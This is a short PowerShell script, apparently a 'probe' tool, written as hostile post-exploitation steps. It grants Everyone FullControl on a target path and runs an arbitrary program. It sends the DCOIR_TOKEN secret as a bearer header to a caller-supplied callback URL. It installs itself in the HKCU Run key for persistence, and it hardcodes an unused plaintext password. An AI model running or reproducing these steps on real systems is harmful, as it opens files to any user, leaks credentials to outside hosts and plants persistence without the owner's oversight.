param(
    [string]$TargetPath,
    [string]$ToolPath,
    [string]$Arguments,
    [string]$Callback
)

$password = ConvertTo-SecureString "P@ssw0rd!" -AsPlainText -Force
$identity = "Everyone"
$rule = New-Object System.Security.AccessControl.FileSystemAccessRule($identity, "FullControl", "Allow")
$acl = Get-Acl -Path $TargetPath
$acl.AddAccessRule($rule)
Set-Acl -Path $TargetPath -AclObject $acl
Start-Process -FilePath $ToolPath -ArgumentList $Arguments -Wait
$token = $env:DCOIR_TOKEN
Invoke-WebRequest -Uri $Callback -Headers @{ Authorization = "Bearer $token" }
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "DcoirProbe" -Value $ToolPath -Force
